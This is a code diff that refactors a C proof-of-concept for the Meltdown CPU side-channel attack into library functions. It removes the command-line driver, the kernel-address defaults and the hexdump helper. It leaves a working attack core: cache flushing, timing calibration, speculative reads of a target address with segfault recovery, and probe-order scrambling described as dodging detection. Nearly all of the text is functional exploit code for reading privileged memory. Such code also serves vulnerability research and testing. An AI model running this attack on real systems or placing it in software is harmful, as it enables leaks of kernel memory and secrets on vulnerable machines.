@@ -49,32 +49,6 @@
 #include "meltdown.h"
 
 /*
- * Debugging
- */
-int verbose;
-
-/*
- * Kernel base address for a few platforms
- */
-#if __amd64__
-#define KERNBASE	0xffffffff80000000UL
-#elif __i386__
-#define KERNBASE	0xc0000000U
-#else
-#error "Unsupported architecture"
-#endif
-
-/*
- * Address and length of data to read
- */
-static uint8_t *atk_addr;
-static size_t atk_len;
-static unsigned int atk_rounds;
-#define DFLT_ATK_ADDR	((uint8_t *)KERNBASE)
-#define DFLT_ATK_LEN	16
-#define DFLT_ATK_ROUNDS	3
-
-/*
  * Probe array
  */
 #define PROBE_SHIFT	12
@@ -95,19 +69,14 @@ static uint64_t avg_hot;
 static uint64_t threshold;
 
 /*
- * Self-test
- */
-static uint8_t selftest[4096];
-
-/*
  * Map our probe array between two guard regions to be absolutely sure
  * that it is not adjacent to memory in use elsewhere in the program.
  */
 #ifndef MAP_GUARD
 #define MAP_GUARD	(MAP_ANON | MAP_PRIVATE)
 #endif
-static void
-init_probe(void)
+void
+meltdown_init(void)
 {
 
 	if (mmap(NULL, PROBE_SIZE, PROT_NONE, MAP_GUARD, -1, 0) == MAP_FAILED)
@@ -126,8 +95,8 @@ init_probe(void)
  * threshold.
  */
 #define CAL_ROUNDS	1048576
-static void
-calibrate(void)
+void
+meltdown_calibrate(void)
 {
 	uint8_t *addr;
 	uint64_t meas, min, max, sum;
@@ -183,41 +152,6 @@ calibrate(void)
 }
 
 /*
- * Print a pretty hex dump of the specified buffer.
- */
-static void
-hexdump(size_t base, const uint8_t *buf, size_t len)
-{
-	unsigned int i;
-	ssize_t res;
-
-	res = len;
-	while (res > 0) {
-		printf("%08zx ", base);
-		for (i = 0; i < 16; ++i) {
-			if (i == 8)
-				printf(" :");
-			if (i < res)
-				printf(" %02x", buf[i]);
-			else
-				printf(" --");
-		}
-		printf(" |");
-		for (i = 0; i < 16; ++i) {
-			if (i == 8)
-				printf(":");
-			if (i < res)
-				printf("%c", is_p(buf[i]) ? buf[i] : '.');
-			else
-				printf("-");
-		}
-		printf("|\n");
-		res -= 16;
-		buf += 16;
-	}
-}
-
-/*
  * Perform the Meltdown attack.
  *
  * For each byte in the specified range:
@@ -231,8 +165,8 @@ hexdump(size_t base, const uint8_t *buf, size_t len)
  */
 static sigjmp_buf jmpenv;
 static void sighandler(int signo) { siglongjmp(jmpenv, signo); }
-static void
-meltdown(void)
+void
+meltdown_attack(const uint8_t *addr, size_t len, unsigned int rounds)
 {
 	unsigned int hist[PROBE_NLINES];
 	uint8_t line[16];
@@ -242,20 +176,20 @@ meltdown(void)
 	uint8_t b;
 
 	VERBOSEF("reading %zu bytes from %p with %u rounds\n",
-	    atk_len, atk_addr, atk_rounds);
+	    len, addr, rounds);
 	sigsegv = signal(SIGSEGV, sighandler);
-	for (i = 0; i < atk_len; ++i) {
+	for (i = 0; i < len; ++i) {
 		memset(hist, 0, sizeof hist);
 		/*
 		 * In each round, flush the cache, try to access the
 		 * target and record what we think its value is based on
 		 * which cache lines are hot after the speculative read.
 		 */
-		for (r = 0; r < atk_rounds; ++r) {
+		for (r = 0; r < rounds; ++r) {
 			if ((signo = sigsetjmp(jmpenv, 1)) == 0) {
 				for (v = 0; v < PROBE_NLINES; ++v)
 					clflush(&probe[v * PROBE_LINELEN]);
-				spec_read(&atk_addr[i], probe, PROBE_SHIFT);
+				spec_read(&addr[i], probe, PROBE_SHIFT);
 			}
 			for (v = 0; v < PROBE_NLINES; ++v) {
 				xv = ((v * 167) + 13) % 256; /* dodge run detection */
@@ -281,101 +215,4 @@ meltdown(void)
 	if (i % 16 > 0)
 		hexdump(i - i % 16, line, i % 16);
 	signal(SIGSEGV, sigsegv);
-}
-
-/*
- * Print usage string and exit.
- */
-static void
-usage(void)
-{
-
-	fprintf(stderr, "usage: meltdown [-v] [-a addr | -s] [-l len] [-n rounds]\n");
-	exit(1);
-}
-
-int
-main(int argc, char *argv[])
-{
-	char *end;
-	uintmax_t umax;
-	unsigned int i;
-	int opt;
-
-	while ((opt = getopt(argc, argv, "a:l:n:sv")) != -1)
-		switch (opt) {
-		case 'a':
-			if (atk_addr != 0)
-				usage();
-			umax = strtoull(optarg, &end, 16);
-			if (end == optarg || *end != '\0')
-				errx(1, "invalid address");
-			atk_addr = (uint8_t *)umax;
-			if ((uintmax_t)atk_addr != umax)
-				errx(1, "address is out of range");
-			break;
-		case 'l':
-			if (atk_len != 0)
-				usage();
-			umax = strtoull(optarg, &end, 0);
-			if (end == optarg || *end != '\0')
-				errx(1, "invalid length");
-			atk_len = umax;
-			if (atk_len == 0 || (uintmax_t)atk_len != umax)
-				errx(1, "length is out of range");
-			break;
-		case 'n':
-			if (atk_rounds != 0)
-				usage();
-			umax = strtoull(optarg, &end, 0);
-			if (end == optarg || *end != '\0')
-				errx(1, "invalid round count");
-			atk_rounds = umax;
-			if (atk_rounds == 0 || (uintmax_t)atk_rounds != umax)
-				errx(1, "round count is out of range");
-			break;
-		case 's':
-			if (atk_addr != 0)
-				usage();
-			atk_addr = selftest;
-			break;
-		case 'v':
-			verbose++;
-			break;
-		default:
-			usage();
-		}
-
-	argc -= optind;
-	argv += optind;
-
-	if (argc)
-		usage();
-
-	/* default address and length */
-	if (atk_addr == 0)
-		atk_addr = DFLT_ATK_ADDR;
-	if (atk_len == 0)
-		atk_len = DFLT_ATK_LEN;
-	if (atk_rounds == 0)
-		atk_rounds = DFLT_ATK_ROUNDS;
-
-	/* generate self-test data if required */
-	if (atk_addr == selftest) {
-		for (i = 0; i < sizeof selftest; ++i)
-			selftest[i] = '!' + i % ('~' - '!' + 1);
-		if (atk_len > sizeof selftest)
-			atk_len = sizeof selftest;
-	}
-
-	/* create the probe array and ensure that it is paged in */
-	init_probe();
-
-	/* calibrate our timer */
-	calibrate();
-
-	/* perform the attack */
-	meltdown();
-
-	exit(0);
 }
